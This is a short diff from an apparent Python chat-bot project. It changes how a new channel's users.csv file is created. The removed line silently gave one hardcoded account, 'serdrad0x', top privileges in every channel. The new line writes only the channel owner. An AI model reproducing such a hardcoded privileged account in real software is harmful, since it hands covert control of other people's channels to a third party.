@@ -96,7 +96,7 @@ def follow(username, message, privileges):
                     settings_file.write("warning_url;False\nwarning_caps;False\nhelp;0\ncoins;0\ncommand_add;99\ncommand_remove;99\ncommand_show;99\nprivileges;99\nsetting;99\nsetting_show;99\nurl;99\nbet;0\nbet_start;99\nbet_stop;99\nbet_reset;99\nfollow;0\nunfollow;0\ninfo;0\nannounce_add;99\nannounce_remove;99\nannounce_show;99\nsmm_level_submit;99\nsmm_level_submit_other;99\nsmm_level_show;99\nsmm_level_next;99\npoll_start;99\npoll_vote;99\npoll_result;99\n")
                     settings_file.close()
                     users_file = open("channel/"+"#"+username+"/"+"users.csv", "w")
-                    users_file.write("serdrad0x;100;100;False;0;0;0\n"+username+";100;100;False;0;0;0\n")
+                    users_file.write(username+";100;100;False;0;0;0\n")
                     users_file.close()
                     main_channel_list.append(["#"+username])
                     save("channel.csv", main_channel_list)
